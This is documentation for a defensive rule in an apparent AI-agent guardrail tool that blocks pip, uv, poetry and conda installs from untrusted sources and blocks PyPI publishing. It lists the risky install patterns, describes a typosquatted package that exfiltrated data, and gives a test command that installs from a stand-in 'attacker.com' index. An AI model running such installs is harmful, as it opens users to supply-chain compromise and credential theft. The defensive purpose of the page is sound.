# `supply-chain.pip-untrusted`

Block pip / uv / poetry / conda installs from untrusted sources, plus PyPI publishing operations.

## What it catches

| Pattern | Why |
|---|---|
| `pip install https://...` / `git+...` / `file:...` | Bypasses PyPI's audit surface |
| `pip install ./pkg.whl` / `./pkg.tar.gz` | Local artifact, no provenance |
| `pip install --index-url <any>` / `-i <any>` | Any explicit index override — configure private indexes in `pip.conf`, not at install time |
| `pip install --extra-index-url ...` | The classic [dependency confusion](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) vector |
| `pip install --trusted-host` | Disables TLS validation for an index |
| `pip install --no-deps` | Disables transitive verification |
| `uv run/install` from URL/git/file | uv equivalents |
| `uvx <url>` | One-shot from arbitrary URL |
| `poetry add` from git/url, `poetry source add` | Poetry equivalents |
| `conda install -c <channel>` / `--channel <channel>` | Any explicit channel override — pin trusted channels in `~/.condarc` instead |
| `twine upload`, `poetry publish` | Publishing to PyPI from agent context |

## Why it matters — hermes-px and ShinyHunters

The [hermes-px PyPI package](https://www.scworld.com/brief/malicious-pypi-package-enables-claude-prompt-data-compromise) was a malicious PyPI typosquat: it included a `base_prompt.pz` file that decompressed into a 246K-character Claude Code system prompt, and a telemetry module that delivered stolen user messages and AI responses to an attacker-controlled Supabase instance.

Broader pattern (per [security research](https://aithinkerlab.com/malicious-claude-code-downloads-warning-2026/)):

> *ShinyHunters has been attributed to supply-chain campaigns targeting AI developer tools through 2025 and into 2026, using typosquatted package names, FOMO-timed publication, and manufactured social proof. Attackers populate malicious packages with convincing READMEs — often generated with an LLM to mirror Anthropic's official documentation — and embed credential-harvesting code inside a postinstall hook that fires the moment `pip install` or `npm install` completes.*

This rule defends the agent from being the install vector. Particular shapes:

- **`--extra-index-url`** is the canonical [dependency confusion](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) vector — pip queries every index in parallel and prefers the highest version, which means an attacker who registers `your-private-pkg-name` on public PyPI can hijack your build.
- **`--trusted-host`** disables TLS validation, which is never the right move for an autonomous agent.
- **`--no-deps`** is occasionally legitimate (debugging), but it disables the transitive-verification chain. Catching it is intentional friction.

## False positives

- `pip install <name>` (PyPI by name) is **not** caught.
- `pip install -r requirements.txt` (pinned file with PyPI names) is **not** caught.
- `pip install -e .` (editable local install of the current project) **is caught** because it can resolve to `file:` semantics. If your workflow needs this, fork the rule and add a positive whitelist for the project root.
- `pip download` is **not** caught — fetching is allowed; only install is denied.
- `poetry install` against a `pyproject.toml` with a configured private index can be caught by the registry-redirect patterns. Pin your private index in a base policy and scope this rule to public-only contexts.

## Test it

```bash
agentlock fake-hook --session <id> --tool Bash \
  --command 'pip install --index-url https://attacker.com/simple some-pkg'
# expect: deny

agentlock fake-hook --session <id> --tool Bash --command 'pip install requests'
# expect: allow
```

## Sources

- [Malicious PyPI package enables Claude prompt, data compromise — SC Media](https://www.scworld.com/brief/malicious-pypi-package-enables-claude-prompt-data-compromise)
- [Malicious Claude Code Downloads — AIThinkerLab](https://aithinkerlab.com/malicious-claude-code-downloads-warning-2026/)
- [Dependency Confusion — Alex Birsan](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
